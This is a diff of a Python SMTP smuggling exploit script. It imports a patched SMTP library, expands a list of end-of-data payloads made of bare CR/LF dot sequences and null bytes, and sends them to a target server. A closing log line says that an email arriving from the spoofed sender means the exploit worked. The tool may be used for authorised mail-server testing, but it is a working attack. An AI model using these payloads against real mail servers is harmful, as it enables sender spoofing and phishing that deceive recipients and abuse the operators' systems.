@@ -1,11 +1,22 @@
-#! /usr/bin/env python3
+#!/usr/bin/env python3
 
 import smtplibhack as smtplib
 import logging
 import argparse
 
 # Payloads
-payloads = [('n.n', '\n.\n'), ('rn.n', '\r\n.\n'), ('n.rn', '\n.\r\n'), ('r.r', '\r.\r'), ('rn0.n', '\r\n\x00.\n'), ('n0.rn', '\n\x00.\r\n')]
+payloads = [
+    ('n.n', '\n.\n'),
+    ('n.r', '\n.\r'),
+    ('r.n', '\r.\n'),
+    ('r.r', '\r.\r'),
+    ('n.rn', '\n.\r\n'),
+    ('rn.n', '\r\n.\n'),
+    ('r.rn', '\r.\r\n'),
+    ('rn.r', '\r\n.\r'),
+    ('rn0.rn', '\r\n\x00.\r\n'),
+    ('rn.0rn', '\r\n.\x00\r\n')
+]
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
@@ -50,3 +61,4 @@ for payload in payloads:
 
 server.quit()  # End the SMTP session
 logging.info(f'Connection closed to {smtp_server}:{smtp_port} SMTP server.')
+logging.info(f'If you have received an email from {spoofed_email} to {receiver_email}, it\'s likely that the exploit worked.')
